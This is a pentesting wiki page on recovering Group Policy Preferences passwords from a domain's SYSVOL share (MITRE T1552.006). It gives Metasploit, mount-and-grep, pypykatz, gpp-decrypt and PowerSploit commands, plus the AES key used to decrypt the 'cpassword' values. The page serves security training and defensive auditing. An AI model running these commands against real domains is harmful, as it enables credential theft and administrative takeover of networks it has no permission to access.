---
description: MITRE ATT&CK™ Sub-technique T1552.006
---

# Group Policy Preferences

## Theory

Windows systems come with a built-in Administrator \(with an RID of 500\) that most organizations want to changed the password of. This can be achieved in multiple ways but there is one that is to be avoided : setting the built-in Administrator's password through Group Policies.

* **Issue 1** : the password is set to be the same for every \(set of\) machine\(s\) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all \(or set of\) machines.
* **Issue 2** : by default, knowing the built-in Administrator's hash \(RID 500\) allows for powerful [Pass-the-Hash](../../abusing-lm-and-ntlm/pass-the-hash.md) attacks \([read more](../../abusing-lm-and-ntlm/pass-the-hash.md#limitations-tips-and-tricks)\).
* **Issue 3** : all Group Policy are stored in the Domain Controllers' SYSVOL share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted🤷♂ .

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, the Domain Controllers' SYSVOL share can be mounted and recursively grepped.

{% hint style="info" %}
The following operations require mounting the SYSVOL share, it can't be done through a docker environment unless it's run with `privileged` rights.
{% endhint %}

The Metasploit Framework can automatically mount the share, look for the `cpassword` string and decrypt every match.

```bash
use auxiliary/scanner/smb/smb_enum_gpp
msf auxiliary(smb_enum_gpp) > set RHOSTS $DOMAIN_CONTROLLER
msf auxiliary(smb_enum_gpp) > set SMBDomain $DOMAIN
msf auxiliary(smb_enum_gpp) > set SMBUser $DOMAIN_USER
msf auxiliary(smb_enum_gpp) > set SMBPass $DOMAIN_PASSWORD
msf auxiliary(smb_enum_gpp) > run
```

This can also be done manually. Tools like [pypykatz](https://github.com/skelsec/pypykatz) \(Python\) and [gpp-decrypt](https://github.com/BustedSec/gpp-decrypt) \(Ruby\) can then be used to decrypt the matches.

```bash
# create the target directory for the mount
sudo mkdir /tmp/sysvol

# mount the SYSVOL share
sudo mount\
    -o domain='domain.local'\
    -o username='someuser'\
    -o password='password'\
    -t cifs\
    '//domain_controller/SYSVOL'\
    /tmp/sysvol

# recursively look for "cpassword" in Group Policies
sudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null

# decrypt the string and recover the password
pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the GPP password can only be recovered from an authenticated \(i.e. domain user\) context \(see [impersonation](../impersonation.md)\).

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) searches a Domain Controller's SYSVOL share `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml` and `Drives.xml` files and returns plaintext passwords

```bash
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

This can also be achieved without tools, by "manually" looking for the `cpassword` string in xml files and by then manually decrypting the matches.

```bash
findstr /S cpassword %logonserver%\sysvol\*.xml
```

The decryption process is as follows

```text
1. decode from base64
2. decrypt from AES-256-CBC the following hex key/iv
    Key : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
    IV : 0000000000000000000000000000000
3. decode from UTF-16LE
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://adsecurity.org/?p=2288" %}

{% embed url="http://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html" %}



